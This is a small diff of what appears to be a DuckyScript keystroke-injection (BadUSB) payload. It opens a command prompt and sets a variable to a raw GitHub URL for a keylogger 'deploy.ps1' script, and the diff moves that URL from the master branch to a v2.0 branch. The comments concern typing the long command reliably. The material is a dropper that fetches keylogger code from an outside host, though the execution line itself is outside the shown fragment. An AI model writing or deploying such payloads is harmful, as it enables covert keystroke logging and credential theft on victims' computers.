@@ -17,7 +17,7 @@ DELAY 1000
 
 REM Now type into cmd — much more reliable than Run dialog for long strings
 REM Split the command into two lines using a variable to avoid dropped chars
-STRING set u=https://raw.githubusercontent.com/pavelyoav-eng/-Project-Cerberus/refs/heads/master/red-team/keylogger/deploy.ps1
+STRING set u=https://raw.githubusercontent.com/pavelyoav-eng/-Project-Cerberus/refs/heads/v2.0/red-team/keylogger/deploy.ps1
 DELAY 300
 ENTER
 DELAY 200
